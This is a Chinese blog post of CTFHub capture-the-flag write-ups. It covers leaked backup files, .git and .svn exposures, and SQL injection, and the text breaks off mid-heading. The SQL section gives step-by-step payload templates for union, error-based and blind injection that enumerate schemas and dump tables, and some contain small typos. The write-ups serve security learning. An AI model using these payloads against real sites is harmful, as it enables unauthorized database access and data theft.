<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ctfhub | 仙心</title><meta name="author" content="xianxin"><meta name="copyright" content="xianxin"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CTFHub1.CTFHub目录遍历使用BP进行目录遍历，找到flag。 2.CTFHub备份文件下载1)网站源码题目给出了很多备份文件的可能的名字，一个个试不太现实，所以用御剑扫描端口，发现有www.zip的页面，访问得到备份文件，然后看到flag的txt文件中没有flag，先去备份文件中尝试访问，发现不行，然后去网页中访问，得到flag。 2)bak文件bak文件第一个题给我们说了他是备份文件">
<meta property="og:type" content="article">
<meta property="og:title" content="ctfhub">
<meta property="og:url" content="https://xianxinyyds.github.io/2025/01/27/ctfhub/index.html">
<meta property="og:site_name" content="仙心">
<meta property="og:description" content="CTFHub1.CTFHub目录遍历使用BP进行目录遍历，找到flag。 2.CTFHub备份文件下载1)网站源码题目给出了很多备份文件的可能的名字，一个个试不太现实，所以用御剑扫描端口，发现有www.zip的页面，访问得到备份文件，然后看到flag的txt文件中没有flag，先去备份文件中尝试访问，发现不行，然后去网页中访问，得到flag。 2)bak文件bak文件第一个题给我们说了他是备份文件">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://xianxinyyds.github.io/img/xianxin.jpg">
<meta property="article:published_time" content="2025-01-27T15:20:58.000Z">
<meta property="article:modified_time" content="2025-08-30T09:11:01.978Z">
<meta property="article:author" content="xianxin">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://xianxinyyds.github.io/img/xianxin.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "ctfhub",
  "url": "https://xianxinyyds.github.io/2025/01/27/ctfhub/",
  "image": "https://xianxinyyds.github.io/img/xianxin.jpg",
  "datePublished": "2025-01-27T15:20:58.000Z",
  "dateModified": "2025-08-30T09:11:01.978Z",
  "author": [
    {
      "@type": "Person",
      "name": "xianxin",
      "url": "https://xianxinyyds.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/xianxin.jpg"><link rel="canonical" href="https://xianxinyyds.github.io/2025/01/27/ctfhub/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ctfhub',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/456.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/xianxin.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/147.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/xianxin.jpg" alt="Logo"><span class="site-name">仙心</span></a><a class="nav-page-title" href="/"><span class="site-name">ctfhub</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">ctfhub</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-01-27T15:20:58.000Z" title="发表于 2025-01-27 23:20:58">2025-01-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-08-30T09:11:01.978Z" title="更新于 2025-08-30 17:11:01">2025-08-30</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">7.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>29分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="CTFHub"><a href="#CTFHub" class="headerlink" title="CTFHub"></a>CTFHub</h1><h2 id="1-CTFHub目录遍历"><a href="#1-CTFHub目录遍历" class="headerlink" title="1.CTFHub目录遍历"></a>1.CTFHub目录遍历</h2><h3 id="使用BP进行目录遍历，找到flag。"><a href="#使用BP进行目录遍历，找到flag。" class="headerlink" title="使用BP进行目录遍历，找到flag。"></a>使用BP进行目录遍历，找到flag。</h3><p><img src="https://pics.lwzheng.tech/2024/12/05/67518d9f4f313.png" alt="图片6" title="WP6"></p>
<h2 id="2-CTFHub备份文件下载"><a href="#2-CTFHub备份文件下载" class="headerlink" title="2.CTFHub备份文件下载"></a>2.CTFHub备份文件下载</h2><h3 id="1-网站源码"><a href="#1-网站源码" class="headerlink" title="1)网站源码"></a>1)网站源码</h3><h3 id="题目给出了很多备份文件的可能的名字，一个个试不太现实，所以用御剑扫描端口，发现有www-zip的页面，访问得到备份文件，然后看到flag的txt文件中没有flag，先去备份文件中尝试访问，发现不行，然后去网页中访问，得到flag。"><a href="#题目给出了很多备份文件的可能的名字，一个个试不太现实，所以用御剑扫描端口，发现有www-zip的页面，访问得到备份文件，然后看到flag的txt文件中没有flag，先去备份文件中尝试访问，发现不行，然后去网页中访问，得到flag。" class="headerlink" title="题目给出了很多备份文件的可能的名字，一个个试不太现实，所以用御剑扫描端口，发现有www.zip的页面，访问得到备份文件，然后看到flag的txt文件中没有flag，先去备份文件中尝试访问，发现不行，然后去网页中访问，得到flag。"></a>题目给出了很多备份文件的可能的名字，一个个试不太现实，所以用御剑扫描端口，发现有<a target="_blank" rel="noopener" href="http://www.zip的页面,访问得到备份文件,然后看到flag的txt文件中没有flag,先去备份文件中尝试访问,发现不行,然后去网页中访问,得到flag./">www.zip的页面，访问得到备份文件，然后看到flag的txt文件中没有flag，先去备份文件中尝试访问，发现不行，然后去网页中访问，得到flag。</a></h3><p><img src="https://pics.lwzheng.tech/2024/12/05/6751b419ac7d8.png" alt="图片7" title="WP7"><br><img src="https://pics.lwzheng.tech/2024/12/05/675191e4bbbef.png" alt="图片8" title="WP8"></p>
<h3 id="2-bak文件"><a href="#2-bak文件" class="headerlink" title="2)bak文件"></a>2)bak文件</h3><h3 id="bak文件第一个题给我们说了他是备份文件后缀名之一，题目又说flag在index-php中，所以访问index-php-bak得到备份文件，进而得到flag。"><a href="#bak文件第一个题给我们说了他是备份文件后缀名之一，题目又说flag在index-php中，所以访问index-php-bak得到备份文件，进而得到flag。" class="headerlink" title="bak文件第一个题给我们说了他是备份文件后缀名之一，题目又说flag在index.php中，所以访问index.php.bak得到备份文件，进而得到flag。"></a>bak文件第一个题给我们说了他是备份文件后缀名之一，题目又说flag在index.php中，所以访问index.php.bak得到备份文件，进而得到flag。</h3><p><img src="https://pics.lwzheng.tech/2024/12/05/6751b553399d6.png" alt="图片9" title="WP9"></p>
<h3 id="3-vim缓存"><a href="#3-vim缓存" class="headerlink" title="3)vim缓存"></a>3)vim缓存</h3><h3 id="搜索vim缓存文件后缀名为-swp，然后直接访问index-php-swp，发现不行，然后继续搜索，得到-swp文件为隐藏文件，需要以-index-php-swp访问，然后得到备份文件，winhex打开得到flag。"><a href="#搜索vim缓存文件后缀名为-swp，然后直接访问index-php-swp，发现不行，然后继续搜索，得到-swp文件为隐藏文件，需要以-index-php-swp访问，然后得到备份文件，winhex打开得到flag。" class="headerlink" title="搜索vim缓存文件后缀名为.swp，然后直接访问index.php.swp，发现不行，然后继续搜索，得到.swp文件为隐藏文件，需要以.index.php.swp访问，然后得到备份文件，winhex打开得到flag。"></a>搜索vim缓存文件后缀名为.swp，然后直接访问index.php.swp，发现不行，然后继续搜索，得到.swp文件为隐藏文件，需要以.index.php.swp访问，然后得到备份文件，winhex打开得到flag。</h3><p><img src="https://pics.lwzheng.tech/2024/12/05/6751b684358f2.png" alt="图片10" title="WP10"></p>
<h3 id="4-DS-Store"><a href="#4-DS-Store" class="headerlink" title="4).DS_Store"></a>4).DS_Store</h3><h3 id="题目提示-DS-Store即为隐藏文件清单，访问下载后用winhex打开，找到flag对应位置，看到上面一串字符，想到可能要访问，但是一开始没看出来中间的-txt后缀，导致试了好多次，看出来之后就成功访问得到flag。"><a href="#题目提示-DS-Store即为隐藏文件清单，访问下载后用winhex打开，找到flag对应位置，看到上面一串字符，想到可能要访问，但是一开始没看出来中间的-txt后缀，导致试了好多次，看出来之后就成功访问得到flag。" class="headerlink" title="题目提示.DS_Store即为隐藏文件清单，访问下载后用winhex打开，找到flag对应位置，看到上面一串字符，想到可能要访问，但是一开始没看出来中间的.txt后缀，导致试了好多次，看出来之后就成功访问得到flag。"></a>题目提示.DS_Store即为隐藏文件清单，访问下载后用winhex打开，找到flag对应位置，看到上面一串字符，想到可能要访问，但是一开始没看出来中间的.txt后缀，导致试了好多次，看出来之后就成功访问得到flag。</h3><h6 id="（以为-tx是后缀也是无敌了）"><a href="#（以为-tx是后缀也是无敌了）" class="headerlink" title="（以为.tx是后缀也是无敌了）"></a>（以为.tx是后缀也是无敌了）</h6><p><img src="https://pics.lwzheng.tech/2024/12/05/6751b86293bc2.png" alt="图片11" title="WP11"></p>
<h2 id="3-CTFHubGit泄露"><a href="#3-CTFHubGit泄露" class="headerlink" title="3.CTFHubGit泄露"></a>3.CTFHubGit泄露</h2><h3 id="1-log"><a href="#1-log" class="headerlink" title="1)log"></a>1)log</h3><h3 id="题目说明要用githack，先下git环境再下githack，电脑上下载出来的运行不了，去kali里面下，安装成功之后对网站-git目录进行源代码恢复，恢复成功后去学git怎么查看历史修改信息，发现是git-log，然后发现添加和移除flag的操作，然后再学怎么查看修改的具体信息，发现可以用git-diff显示两次提交之间的差异，然后得到flag。"><a href="#题目说明要用githack，先下git环境再下githack，电脑上下载出来的运行不了，去kali里面下，安装成功之后对网站-git目录进行源代码恢复，恢复成功后去学git怎么查看历史修改信息，发现是git-log，然后发现添加和移除flag的操作，然后再学怎么查看修改的具体信息，发现可以用git-diff显示两次提交之间的差异，然后得到flag。" class="headerlink" title="题目说明要用githack，先下git环境再下githack，电脑上下载出来的运行不了，去kali里面下，安装成功之后对网站.git目录进行源代码恢复，恢复成功后去学git怎么查看历史修改信息，发现是git log，然后发现添加和移除flag的操作，然后再学怎么查看修改的具体信息，发现可以用git diff显示两次提交之间的差异，然后得到flag。"></a>题目说明要用githack，先下git环境再下githack，电脑上下载出来的运行不了，去kali里面下，安装成功之后对网站.git目录进行源代码恢复，恢复成功后去学git怎么查看历史修改信息，发现是git log，然后发现添加和移除flag的操作，然后再学怎么查看修改的具体信息，发现可以用git diff显示两次提交之间的差异，然后得到flag。</h3><p><img src="https://pics.lwzheng.tech/2024/12/06/6752fe7ed9d3a.png" alt="图片12" title="WP12"><br><img src="https://pics.lwzheng.tech/2024/12/06/6752fe8662898.png" alt="图片13" title="WP13"><br><img src="https://pics.lwzheng.tech/2024/12/06/6752fe8d2f220.png" alt="图片14" title="WP14"></p>
<h3 id="2-stash"><a href="#2-stash" class="headerlink" title="2)stash"></a>2)stash</h3><h3 id="前面是跟第一个log题几乎一样的步骤，不过要用git-stash-list来查看用stash保存的信息，然后再要git-stash-apply获取保存信息，就得到flag了。"><a href="#前面是跟第一个log题几乎一样的步骤，不过要用git-stash-list来查看用stash保存的信息，然后再要git-stash-apply获取保存信息，就得到flag了。" class="headerlink" title="前面是跟第一个log题几乎一样的步骤，不过要用git stash list来查看用stash保存的信息，然后再要git stash apply获取保存信息，就得到flag了。"></a>前面是跟第一个log题几乎一样的步骤，不过要用git stash list来查看用stash保存的信息，然后再要git stash apply获取保存信息，就得到flag了。</h3><p><img src="https://pics.lwzheng.tech/2024/12/06/6753063dbf314.png" alt="图片15" title="WP15"></p>
<h3 id="3-index"><a href="#3-index" class="headerlink" title="3)index"></a>3)index</h3><h3 id="这个题直接githack源代码修复就出来了。"><a href="#这个题直接githack源代码修复就出来了。" class="headerlink" title="这个题直接githack源代码修复就出来了。"></a>这个题直接githack源代码修复就出来了。</h3><h6 id="怎么比前面还简单，是我阴差阳错做出来的？"><a href="#怎么比前面还简单，是我阴差阳错做出来的？" class="headerlink" title="怎么比前面还简单，是我阴差阳错做出来的？"></a>怎么比前面还简单，是我阴差阳错做出来的？</h6><p><img src="https://pics.lwzheng.tech/2024/12/06/675307c8568ed.png" alt="图片16" title="WP16"></p>
<h2 id="4-CTFHubSVN泄露"><a href="#4-CTFHubSVN泄露" class="headerlink" title="4.CTFHubSVN泄露"></a>4.CTFHubSVN泄露</h2><h3 id="先用disearch扫描确定是否有SVN泄露，找到之后dvcs-ripper把SVN文件下载下来，然后打开-svn文件夹，发现有很多文件夹，所以用tree命令来查找那个文件夹有文件，然后去pristine文件夹cat文件，一个个访问后在75文件夹下的文件里面有flag。"><a href="#先用disearch扫描确定是否有SVN泄露，找到之后dvcs-ripper把SVN文件下载下来，然后打开-svn文件夹，发现有很多文件夹，所以用tree命令来查找那个文件夹有文件，然后去pristine文件夹cat文件，一个个访问后在75文件夹下的文件里面有flag。" class="headerlink" title="先用disearch扫描确定是否有SVN泄露，找到之后dvcs-ripper把SVN文件下载下来，然后打开.svn文件夹，发现有很多文件夹，所以用tree命令来查找那个文件夹有文件，然后去pristine文件夹cat文件，一个个访问后在75文件夹下的文件里面有flag。"></a>先用disearch扫描确定是否有SVN泄露，找到之后dvcs-ripper把SVN文件下载下来，然后打开.svn文件夹，发现有很多文件夹，所以用tree命令来查找那个文件夹有文件，然后去pristine文件夹cat文件，一个个访问后在75文件夹下的文件里面有flag。</h3><p><img src="https://pics.lwzheng.tech/2024/12/07/675425a40a78b.png" alt="图片17" title="WP17"><br><img src="https://pics.lwzheng.tech/2024/12/07/675425bd9793c.png" alt="图片18" title="WP18"><br><img src="https://pics.lwzheng.tech/2024/12/07/675425c0ac200.png" alt="图片19" title="WP19"><br><img src="https://pics.lwzheng.tech/2024/12/07/675425ce6dfd8.png" alt="图片20" title="WP20"></p>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="1-整数型注入和字符型注入"><a href="#1-整数型注入和字符型注入" class="headerlink" title="1)整数型注入和字符型注入"></a>1)整数型注入和字符型注入</h3><h3 id="这两个的区别可以用-id-1asd来判断，正常回显为字符，错误回显为整数。整数型不需要-‘-闭合，字符型需要-’-闭合。"><a href="#这两个的区别可以用-id-1asd来判断，正常回显为字符，错误回显为整数。整数型不需要-‘-闭合，字符型需要-’-闭合。" class="headerlink" title="这两个的区别可以用?id&#x3D;1asd来判断，正常回显为字符，错误回显为整数。整数型不需要 ‘ 闭合，字符型需要 ’ 闭合。"></a>这两个的区别可以用?id&#x3D;1asd来判断，正常回显为字符，错误回显为整数。整数型不需要 ‘ 闭合，字符型需要 ’ 闭合。</h3><h3 id="其余的过程基本相似"><a href="#其余的过程基本相似" class="headerlink" title="其余的过程基本相似"></a>其余的过程基本相似</h3><h3 id="第0步：确定有没有sql注入的漏洞，可以通过下面get判断。"><a href="#第0步：确定有没有sql注入的漏洞，可以通过下面get判断。" class="headerlink" title="第0步：确定有没有sql注入的漏洞，可以通过下面get判断。"></a>第0步：确定有没有sql注入的漏洞，可以通过下面get判断。</h3><blockquote>
<p>?id&#x3D;1’ and 1&#x3D;1 –+<br>?id&#x3D;1’ and 1&#x3D;2 –+<br>如果第一个正常回显，第二个不正常回显，则存在sql注入漏洞。</p>
</blockquote>
<h3 id="第一步：确定有几个字段-从大到小用二分法效率更高"><a href="#第一步：确定有几个字段-从大到小用二分法效率更高" class="headerlink" title="第一步：确定有几个字段(从大到小用二分法效率更高)"></a>第一步：确定有几个字段(从大到小用二分法效率更高)</h3><blockquote>
<p>?id&#x3D;1’ order by 1  –+<br>?id&#x3D;1’ order by 2  –+<br>……..<br>?id&#x3D;1’ order by n –+<br>直到错误回显为止。</p>
</blockquote>
<h3 id="第二步：判断回显位"><a href="#第二步：判断回显位" class="headerlink" title="第二步：判断回显位"></a>第二步：判断回显位</h3><blockquote>
<p>?id&#x3D;-1’ union select 1,2,….,r –+</p>
</blockquote>
<h3 id="第三步：查看数据库名，将回显位改为database"><a href="#第三步：查看数据库名，将回显位改为database" class="headerlink" title="第三步：查看数据库名，将回显位改为database()"></a>第三步：查看数据库名，将回显位改为database()</h3><blockquote>
<p>?id&#x3D;-1’ union select 1,database(),……,r –+</p>
</blockquote>
<h3 id="第四步：查找数据库中的表名"><a href="#第四步：查找数据库中的表名" class="headerlink" title="第四步：查找数据库中的表名"></a>第四步：查找数据库中的表名</h3><blockquote>
<p>?id&#x3D;-1’ union select 1,(select table_name from information_schema.tables where database&#x3D;’数据库名’),…,r –+</p>
</blockquote>
<h3 id="第五步：查找表中的列名"><a href="#第五步：查找表中的列名" class="headerlink" title="第五步：查找表中的列名"></a>第五步：查找表中的列名</h3><blockquote>
<p>?id&#x3D;-1’ union select 1,(select column_name from information_schema.columns where database&#x3D;’数据库名’ and table&#x3D;’表名’),…,r –+</p>
</blockquote>
<h3 id="第六步：查找表中的数据（脱库）"><a href="#第六步：查找表中的数据（脱库）" class="headerlink" title="第六步：查找表中的数据（脱库）"></a>第六步：查找表中的数据（脱库）</h3><blockquote>
<p>?id&#x3D;-1’ union select 1,(select 列名 from 表名),…,r –+</p>
</blockquote>
<h2 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="2)报错注入"></a>2)报错注入</h2><h3 id="原理是利用报错回显进行查询注入，利用updatexml和extractvalue进行查询，同时把0x7e（-）和注入语句加入查询命令的参数中。"><a href="#原理是利用报错回显进行查询注入，利用updatexml和extractvalue进行查询，同时把0x7e（-）和注入语句加入查询命令的参数中。" class="headerlink" title="原理是利用报错回显进行查询注入，利用updatexml和extractvalue进行查询，同时把0x7e（~）和注入语句加入查询命令的参数中。"></a>原理是利用报错回显进行查询注入，利用updatexml和extractvalue进行查询，同时把0x7e（<code>~</code>）和注入语句加入查询命令的参数中。</h3><blockquote>
<p>?id&#x3D;-1’ and updatexml(1,concat(0x7e,(注入命令),0x7e),3) –+<br>?id&#x3D;-1’ and extractvalue(1,concat(0x7e,(注入命令),0x7e)) –+</p>
</blockquote>
<h3 id="注入命令同第一类。"><a href="#注入命令同第一类。" class="headerlink" title="注入命令同第一类。"></a>注入命令同第一类。</h3><h3 id="但是由于报错回显有字数限制，所以可以用substr进行字符串截断来进行分段输出。"><a href="#但是由于报错回显有字数限制，所以可以用substr进行字符串截断来进行分段输出。" class="headerlink" title="但是由于报错回显有字数限制，所以可以用substr进行字符串截断来进行分段输出。"></a>但是由于报错回显有字数限制，所以可以用substr进行字符串截断来进行分段输出。</h3><blockquote>
<p>?id&#x3D;-1’ and updatexml(1,concat(0x7e,substr((注入命令),1,31),0x7e),3) –+<br>?id&#x3D;-1’ and extractvalue(1,concat(0x7e,substr((注入命令),32,31),0x7e)) –+</p>
</blockquote>
<h2 id="3-布尔盲注和延时盲注"><a href="#3-布尔盲注和延时盲注" class="headerlink" title="3)布尔盲注和延时盲注"></a>3)布尔盲注和延时盲注</h2><h3 id="在注入时回显只有正确和错误的布尔盲注，或者根本没有回显的延时盲注情况下，利用if-判断命令，sleep（x），1）函数将延时盲注转换为布尔盲注，再利用length和count方便判断长度和数量，用ascii（substr（注入命令，n-1））一个一个的判断字符来获取数据。"><a href="#在注入时回显只有正确和错误的布尔盲注，或者根本没有回显的延时盲注情况下，利用if-判断命令，sleep（x），1）函数将延时盲注转换为布尔盲注，再利用length和count方便判断长度和数量，用ascii（substr（注入命令，n-1））一个一个的判断字符来获取数据。" class="headerlink" title="在注入时回显只有正确和错误的布尔盲注，或者根本没有回显的延时盲注情况下，利用if(判断命令，sleep（x），1）函数将延时盲注转换为布尔盲注，再利用length和count方便判断长度和数量，用ascii（substr（注入命令，n,1））一个一个的判断字符来获取数据。"></a>在注入时回显只有正确和错误的布尔盲注，或者根本没有回显的延时盲注情况下，利用if(判断命令，sleep（x），1）函数将延时盲注转换为布尔盲注，再利用length和count方便判断长度和数量，用ascii（substr（注入命令，n,1））一个一个的判断字符来获取数据。</h3><blockquote>
<p>?id&#x3D;1’ and length（select database（））&#x3D;4 #   （也可以用&gt;和&lt;二分来加速判断）<br>?id&#x3D;1’ and ascii(substr((select database()),1,1))&#x3D;107 #   （一个一个字符的判断）<br>?id&#x3D;1’ and length((select table_name from information_schema.tables where table_schema&#x3D;’数据库名’ limit n,1))&#x3D;4 #  （改变n来一个个判断表名长度）<br>?id&#x3D;1’ and ascii（substr((select table_name from information_schema.tables where table_schema&#x3D;’数据库名’ limit n,1))，1,1））&#x3D;107 #  （一个个判断表名的字符）<br>?id&#x3D;1’ and length((select column_name from information_schema.columns where table_schema&#x3D;’库名’ and table_name&#x3D;’表名’ limit n,1))&#x3D;4 # （改变n来一个个判断列名长度）<br>?id&#x3D;1’ and ascii（substr((select column_name from information_schema.columns where table_schema&#x3D;’库名’ and table_name&#x3D;’表名’ limit n,1)，1,1））&#x3D;&#x3D;107 #  （一个个判断列名的字符）<br>?id&#x3D;1’ and length((select 列名 from 表名 limit n,1))&#x3D;4 #（改变n来一个个判断数据长度）<br>?id&#x3D;1’ and ascii(substr((select 列名 from 表名 limit 0,1),1,1))&#x3D;107 #（一个个判断数据的字符）</p>
</blockquote>
<h3 id="由此可见工程量非常非常大，即使利用BP进行字符判断，也非常复杂，所以直接用sqlmap做了。"><a href="#由此可见工程量非常非常大，即使利用BP进行字符判断，也非常复杂，所以直接用sqlmap做了。" class="headerlink" title="由此可见工程量非常非常大，即使利用BP进行字符判断，也非常复杂，所以直接用sqlmap做了。"></a>由此可见工程量非常非常大，即使利用BP进行字符判断，也非常复杂，所以直接用sqlmap做了。</h3><h2 id="4-cookie注入，UA注入，refer注入"><a href="#4-cookie注入，UA注入，refer注入" class="headerlink" title="4)cookie注入，UA注入，refer注入"></a>4)cookie注入，UA注入，refer注入</h2><h3 id="都是改了注入点，用hackbar或者BP都可以很简单的做出来，方法和第一种类似，就不赘述了"><a href="#都是改了注入点，用hackbar或者BP都可以很简单的做出来，方法和第一种类似，就不赘述了" class="headerlink" title="都是改了注入点，用hackbar或者BP都可以很简单的做出来，方法和第一种类似，就不赘述了"></a>都是改了注入点，用hackbar或者BP都可以很简单的做出来，方法和第一种类似，就不赘述了</h3><h2 id="5-sql结构"><a href="#5-sql结构" class="headerlink" title="5)sql结构"></a>5)sql结构</h2><h3 id="同第一类。"><a href="#同第一类。" class="headerlink" title="同第一类。"></a>同第一类。</h3><h2 id="6-空格过滤"><a href="#6-空格过滤" class="headerlink" title="6)空格过滤"></a>6)空格过滤</h2><h3 id="用-代替即可，-str-为sql中的注释，注入后就变成空格了"><a href="#用-代替即可，-str-为sql中的注释，注入后就变成空格了" class="headerlink" title="用&#x2F;**&#x2F;代替即可，/*str*/为sql中的注释，注入后就变成空格了"></a>用&#x2F;**&#x2F;代替即可，<code>/*str*/</code>为sql中的注释，注入后就变成空格了</h3><h2 id="7-mysql在联合查询不存在的数据时，会自动构建虚拟数据-GXYCTF2019-BabySQli"><a href="#7-mysql在联合查询不存在的数据时，会自动构建虚拟数据-GXYCTF2019-BabySQli" class="headerlink" title="7)mysql在联合查询不存在的数据时，会自动构建虚拟数据 ([GXYCTF2019]BabySQli)"></a>7)mysql在联合查询不存在的数据时，会自动构建虚拟数据 